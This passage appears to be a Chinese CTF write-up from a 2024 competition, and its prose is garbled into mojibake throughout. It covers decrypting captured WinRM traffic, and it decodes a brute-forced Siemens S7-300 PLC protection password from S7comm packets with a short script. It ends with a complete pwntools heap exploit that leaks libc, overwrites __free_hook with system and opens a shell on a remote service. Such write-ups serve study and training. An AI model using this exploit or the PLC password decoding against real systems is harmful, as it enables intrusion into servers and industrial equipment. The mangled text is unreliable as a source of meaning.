</span></span></code></pre></td></tr></table></div></div><p>ä¸€ä¸ªæ˜¯äº‘å½±ï¼Œä¸€ä¸ªæ˜¯è«æ–¯</p><p>äº‘å½±å¾—åˆ°å‹ç¼©åŒ…çš„passwordæ˜¯AUCLWJQBUCIW</p><p>è«æ–¯ç”¨æ¥åšAESè§£å¯†</p><p><img src=/img/2024-06-23-PDCTF/1719148195051-60.png alt=img></p><h2 id=myerp>myerp</h2><p>ä¼°è®¡æ˜¯éé¢„æœŸ</p><p><img src=/img/2024-06-23-PDCTF/1719148195051-61.png alt=img></p><p><img src=/img/2024-06-23-PDCTF/1719148195051-62.png alt=img></p><p><a href=http://www.qetx.top/posts/19553/>http://www.qetx.top/posts/19553/</a></p><p><img src=/img/2024-06-23-PDCTF/1719148195051-63.png alt=img></p><p><img src=/img/2024-06-23-PDCTF/1719148195051-64.png alt=img></p><h2 id=æ˜¯è°å·å·å·èµ°æˆ‘çš„å¿ƒ>æ˜¯è°å·å·å·èµ°æˆ‘çš„å¿ƒ</h2><p><img src=/img/2024-06-23-PDCTF/1719148195051-65.png alt=img></p><p>å¾ˆæ˜æ˜¾æ˜¯åŸŸæ§æµé‡ï¼Œç­›é€‰å‡ºHTTPæµé‡å‘ç°æ¶‰åŠåˆ°winrmåè®®</p><p><img src=/img/2024-06-23-PDCTF/1719148195051-66.png alt=img></p><p><a href=https://gist.github.com/jborean93/d6ff5e87f8a9f5cb215cd49826523045/>https://gist.github.com/jborean93/d6ff5e87f8a9f5cb215cd49826523045/</a></p><p>æ‰¾åˆ°ä¸€ä¸ªè§£å¯†è„šæœ¬ï¼Œéå¸¸å¥½ç”¨ï¼Œç°åœ¨å¼€å§‹å¯»æ‰¾NTLM</p><p><img src=/img/2024-06-23-PDCTF/1719148195051-67.png alt=img></p><p>æˆåŠŸè§£å¯†ï¼ŒWindowsè·‘è„šæœ¬ä¼šæŠ¥é”™ï¼ŒLinux åˆ™ä¸ä¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl>joker@kali:/mnt/d/Projects/CTFProjects/CTF2024/ç†ŠçŒ«æ¯/æ˜¯è°å·å·å·èµ°æˆ‘çš„å¿ƒ$ python3 winrm_decrypt.py  -n 579da618cfbfa85247acf1f800a280a4 getshell.pcapng 
</span></span><span class=line><span class=cl>No: <span class=m>1014</span> <span class=p>|</span> Time: 2024-06-06T10:24:15.289523 <span class=p>|</span> Source: 192.168.106.1 <span class=p>|</span> Destination: 192.168.106.170
</span></span><span class=line><span class=cl>&lt;?xml <span class=nv>version</span><span class=o>=</span><span class=s2>&#34;1.0&#34;</span> ?&gt;
</span></span><span class=line><span class=cl>......
</span></span><span class=line><span class=cl>joker@kali:/mnt/d/Projec
</span></span></code></pre></td></tr></table></div></div><p>è·å–å…¶ä¸­flag.txtå†…å®¹</p><p><img src=/img/2024-06-23-PDCTF/1719148195051-68.png alt=img></p><p><img src=/img/2024-06-23-PDCTF/1719148195051-69.png alt=img></p><p><img src=/img/2024-06-23-PDCTF/1719148195051-70.png alt=img></p><h1 id=å·¥æ§>å·¥æ§</h1><h2 id=ics2>ICS2</h2><p>ç›´æ¥åˆ†æS7COMMåè®®å†…å®¹ï¼Œå…ˆå»ºç«‹äº†é€šä¿¡é“¾è·¯ï¼š</p><p><img src=/img/2024-06-23-PDCTF/1719148195052-72.png alt=img></p><p>åœ¨ä¸‹é¢å‡ ä¸ªåŒ…å¯ä»¥æ‰¾åˆ°è®¢å•å·ï¼š6ES7 841-0CC05-0YA5</p><p><img src=/img/2024-06-23-PDCTF/1719148195052-73.png alt=img></p><p>åŒæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“è¿™å°S7è®¾å¤‡çš„ipä¸º192.168.1.15ï¼Œå› æ­¤å¯ä»¥æŠŠå®ƒçš„æµé‡å•ç‹¬è¿‡æ»¤å‡ºæ¥ã€‚è¿™é‡Œæ”»å‡»è€…è¿›è¡Œäº†å¯¹passwordçš„ä¸æ–­çˆ†ç ´ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä»–çˆ†ç ´æˆåŠŸçš„æ ‡å¿—ã€‚</p><p><img src=/img/2024-06-23-PDCTF/1719148195052-74.png alt=img></p><p>ä¸‹é¢è¿™æ˜¯æ²¡æˆåŠŸçš„æƒ…å†µï¼Œæœ‰error codeæç¤ºï¼š</p><p><img src=/img/2024-06-23-PDCTF/1719148195052-75.png alt=img></p><p>ä¸€ç›´å¾€ä¸‹ç¿»ï¼Œæ‰¾åˆ°æ²¡æœ‰æŠ¥é”™çš„å“åº”åŒ…ï¼š</p><p><img src=/img/2024-06-23-PDCTF/1719148195052-76.png alt=img></p><p>åŒæ—¶å»è¯·æ±‚åŒ…é‡Œæ‰¾åˆ°çˆ†å‡ºçš„passwordï¼š19253a012c602d66</p><p><img src=/img/2024-06-23-PDCTF/1719148195052-77.png alt=img></p><p>S7-300å¯¹cpuçš„ä¿æŠ¤å¯†ç è¿›è¡Œäº†åŠ å¯†ï¼Œå¯ä»¥å‚è€ƒï¼šhttps://blog.csdn.net/xsdfhh/article/details/113547469</p><p>å†™ä¸ªè§£å¯†è„šæœ¬ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>hex_data</span> <span class=o>=</span> <span class=s2>&#34;19253a012c602d66&#34;</span>
</span></span><span class=line><span class=cl><span class=n>byte_array</span> <span class=o>=</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>hex_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>decoded_data</span> <span class=o>=</span> <span class=p>[</span><span class=mh>0x20</span><span class=p>]</span> <span class=o>*</span> <span class=mi>8</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>decoded_data</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=n>byte_array</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>^</span> <span class=mh>0x55</span>
</span></span><span class=line><span class=cl><span class=n>decoded_data</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=n>byte_array</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>^</span> <span class=mh>0x55</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=mi>8</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>decoded_data</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>byte_array</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>^</span> <span class=mh>0x55</span> <span class=o>^</span> <span class=n>byte_array</span><span class=p>[</span><span class=n>i</span> <span class=o>-</span> <span class=mi>2</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>password</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=nb>chr</span><span class=p>(</span><span class=n>b</span><span class=p>)</span> <span class=k>for</span> <span class=n>b</span> <span class=ow>in</span> <span class=n>decoded_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>password</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># LpvqC4TS </span>
</span></span></code></pre></td></tr></table></div></div><p>è¿™é‡Œå°±å¯ä»¥å¾—åˆ°çœŸå®çš„cpuä¿æŠ¤å¯†ç ã€‚åé¢æ”»å‡»è€…åšäº†ä¸ªuploadçš„æ“ä½œï¼Œæ„Ÿè§‰æ²¡å•¥ä¸œè¥¿ã€‚æ¥ä¸‹æ¥æ˜¯è¦æ‰¾åˆ°MåŒºåç§»é‡10çš„å€¼ï¼Œéœ€è¦æ‰¾å†™å…¥æµé‡write varæŒ‡ä»¤ã€‚</p><p><img src=/img/2024-06-23-PDCTF/1719148195052-78.png alt=img></p><p>ç”¨æ“ä½œç è¿‡æ»¤&rsquo;s7comm.param.func == 5&rsquo;ï¼Œç„¶åä¸€æ¡æ¡æ‰¾å°±è¡Œï¼š</p><p><img src=/img/2024-06-23-PDCTF/1719148195052-79.png alt=img></p><p>æœ€åä¸‰ä¸ªå¯è§å­—ç¬¦å°±æ˜¯i#R</p><p>æœ€ç»ˆå¾—åˆ°çš„flagå°±æ˜¯</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Plain data-lang=Plain><span class=line><span class=cl>flag{0YA5LpvqC4TSi#R}
</span></span></code></pre></td></tr></table></div></div><h1 id=aiæ¼æ´æŒ–æ˜>AIæ¼æ´æŒ–æ˜</h1><h2 id=panda>panda</h2><p>ç›´æ¥é‡Šæ”¾å†ç”³è¯·å°±å¯ä»¥è·å¾—<code>libc</code>åœ°å€ï¼Œéšåçœ‹èµ·æ¥æœ‰ä¸¤ä¸ªåœ°æ–¹æœ‰é—®é¢˜ï¼š</p><ul><li><code>delete</code>æ—¶æœ€åä¸€ä¸ª<code>chunk</code>ä¼šè¢«å¤åˆ¶</li><li><code>size</code>å¡«å†™ä¸ºè´Ÿæ•°æ—¶å­˜åœ¨å †æº¢å‡º</li></ul><p>ç¬¬ä¸€ç§ç”±äºåœ¨<code>delete</code>æ—¶è¿˜ä¼šè¿›è¡Œ<code>count</code>æ£€æŸ¥ï¼Œå› æ­¤åˆ©ç”¨å †æº¢å‡ºæ‰“<code>__free_hook</code>å³å¯ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span><span class=lnt>88
</span><span class=lnt>89
</span><span class=lnt>90
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>filename</span> <span class=o>=</span> <span class=s1>&#39;./main&#39;</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>arch</span><span class=o>=</span><span class=s1>&#39;amd64&#39;</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s2>&#34;debug&#34;</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>terminal</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;tmux&#39;</span><span class=p>,</span> <span class=s1>&#39;neww&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>local</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>all_logs</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>filename</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>libc</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>local</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=n>filename</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;173.30.16.227&#39;</span><span class=p>,</span> <span class=mi>9999</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>debug</span><span class=p>(</span><span class=n>params</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>an_log</span> <span class=ow>in</span> <span class=n>all_logs</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>success</span><span class=p>(</span><span class=n>an_log</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>pid</span> <span class=o>=</span> <span class=n>util</span><span class=o>.</span><span class=n>proc</span><span class=o>.</span><span class=n>pidof</span><span class=p>(</span><span class=n>sh</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>pid</span><span class=p>,</span> <span class=n>params</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>pause</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>choice_words</span> <span class=o>=</span> <span class=s1>&#39;Enter your choice: &#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>menu_del</span> <span class=o>=</span> <span class=mi>4</span>
</span></span><span class=line><span class=cl><span class=n>del_index_words</span> <span class=o>=</span> <span class=s1>&#39;Enter panda id to delete: &#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>menu_show</span> <span class=o>=</span> <span class=mi>3</span>
</span></span><span class=line><span class=cl><span class=n>show_index_words</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=n>size</span><span class=p>,</span> <span class=n>name</span><span class=p>,</span> <span class=n>content</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=n>choice_words</span><span class=p>,</span> <span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;Enter size: &#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s1>&#39;Enter panda name: &#39;</span><span class=p>,</span> <span class=n>name</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s1>&#39;Enter panda content: &#39;</span><span class=p>,</span> <span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>delete</span><span class=p>(</span><span class=n>index</span><span class=o>=-</span><span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=n>choice_words</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>menu_del</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>del_index_words</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>sh</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=n>del_index_words</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>show</span><span class=p>(</span><span class=n>index</span><span class=o>=-</span><span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=n>choice_words</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>menu_show</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>show_index_words</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>sh</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=n>show_index_words</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit</span><span class=p>(</span><span class=n>index</span><span class=p>,</span> <span class=n>name</span><span class=p>,</span> <span class=n>content</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=n>choice_words</span><span class=p>,</span> <span class=s1>&#39;2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;Enter panda id to edit: &#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;Enter panda name: &#39;</span><span class=p>,</span> <span class=n>name</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s1>&#39;Enter panda content: &#39;</span><span class=p>,</span> <span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>leak_info</span><span class=p>(</span><span class=n>name</span><span class=p>,</span> <span class=n>addr</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>output_log</span> <span class=o>=</span> <span class=s1>&#39;</span><span class=si>{}</span><span class=s1> =&gt; </span><span class=si>{}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>name</span><span class=p>,</span> <span class=nb>hex</span><span class=p>(</span><span class=n>addr</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>all_logs</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>output_log</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>success</span><span class=p>(</span><span class=n>output_log</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=n>size</span><span class=o>=</span><span class=mh>0x500</span><span class=p>,</span> <span class=n>name</span><span class=o>=</span><span class=sa>b</span><span class=s1>&#39;aaa&#39;</span><span class=p>,</span> <span class=n>content</span><span class=o>=</span><span class=sa>b</span><span class=s1>&#39;content&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=n>size</span><span class=o>=</span><span class=mh>0x80</span><span class=p>,</span> <span class=n>name</span><span class=o>=</span><span class=s1>&#39;name&#39;</span><span class=p>,</span> <span class=n>content</span><span class=o>=</span><span class=s1>&#39;content&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=n>index</span><span class=o>=</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=n>size</span><span class=o>=</span><span class=mh>0x500</span><span class=p>,</span> <span class=n>name</span><span class=o>=</span><span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=p>,</span> <span class=n>content</span><span class=o>=</span><span class=sa>b</span><span class=s1>&#39;z&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Name: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Name: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc_leak</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>sh</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>6</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>leak_info</span><span class=p>(</span><span class=s1>&#39;libc_leak&#39;</span><span class=p>,</span> <span class=n>libc_leak</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=n>libc_leak</span> <span class=o>-</span> <span class=mh>0x1ecb61</span>
</span></span><span class=line><span class=cl><span class=n>leak_info</span><span class=p>(</span><span class=s1>&#39;libc.address&#39;</span><span class=p>,</span> <span class=n>libc</span><span class=o>.</span><span class=n>address</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=n>size</span><span class=o>=-</span><span class=mh>0x10</span><span class=p>,</span> <span class=n>name</span><span class=o>=</span><span class=sa>b</span><span class=s1>&#39;aaa&#39;</span><span class=p>,</span> <span class=n>content</span><span class=o>=</span><span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x10</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=n>size</span><span class=o>=</span><span class=mh>0x10</span><span class=p>,</span> <span class=n>name</span><span class=o>=</span><span class=sa>b</span><span class=s1>&#39;aaa&#39;</span><span class=p>,</span> <span class=n>content</span><span class=o>=</span><span class=s1>&#39;bbb&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=n>size</span><span class=o>=</span><span class=mh>0x10</span><span class=p>,</span> <span class=n>name</span><span class=o>=</span><span class=sa>b</span><span class=s1>&#39;aaa&#39;</span><span class=p>,</span> <span class=n>content</span><span class=o>=</span><span class=s1>&#39;bbb&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=n>size</span><span class=o>=</span><span class=mh>0x10</span><span class=p>,</span> <span class=n>name</span><span class=o>=</span><span class=sa>b</span><span class=s1>&#39;aaa&#39;</span><span class=p>,</span> <span class=n>content</span><span class=o>=</span><span class=s1>&#39;bbb&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=n>size</span><span class=o>=</span><span class=mh>0x10</span><span class=p>,</span> <span class=n>name</span><span class=o>=</span><span class=sa>b</span><span class=s1>&#39;aaa&#39;</span><span class=p>,</span> <span class=n>content</span><span class=o>=</span><span class=s1>&#39;bbb&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=n>index</span><span class=o>=</span><span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=n>index</span><span class=o>=</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=n>size</span><span class=o>=</span><span class=mh>0x50</span><span class=p>,</span> <span class=n>name</span><span class=o>=</span><span class=sa>b</span><span class=s1>&#39;aaa&#39;</span><span class=p>,</span> <span class=n>content</span><span class=o>=</span><span class=s1>&#39;bbb&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>3</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x41</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__free_hook&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=n>index</span><span class=o>=</span><span class=mi>2</span><span class=p>,</span> <span class=n>name</span><span class=o>=</span><span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=p>,</span> <span class=n>content</span><span class=o>=</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=n>size</span><span class=o>=</span><span class=mh>0x10</span><span class=p>,</span> <span class=n>name</span><span class=o>=</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>,</span> <span class=n>content</span><span class=o>=</span><span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=n>size</span><span class=o>=</span><span class=mh>0x10</span><span class=p>,</span> <span class=n>name</span><span class=o>=</span><span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>]),</span> <span class=n>content</span><span class=o>=</span><span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=n>index</span><span class=o>=</span><span class=mi>6</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
